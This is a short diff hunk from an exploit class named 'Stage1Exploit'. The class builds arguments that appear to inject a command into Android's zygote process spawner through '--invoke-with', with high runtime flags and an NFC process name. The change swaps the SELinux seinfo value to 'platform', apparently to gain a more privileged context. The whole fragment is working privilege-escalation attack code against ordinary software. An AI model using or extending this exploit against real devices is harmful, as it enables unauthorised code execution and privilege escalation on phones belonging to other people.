@@ -194,7 +194,7 @@ class Stage1Exploit:
             "--setgroups=3003",
             "--runtime-args",
             "--nice-name=nfc",
-            "--seinfo=nfc:nfc:complete",
+            "--seinfo=platform:nfc:complete",
             "--runtime-flags=32767",
             "--invoke-with",
             f"{command}#",
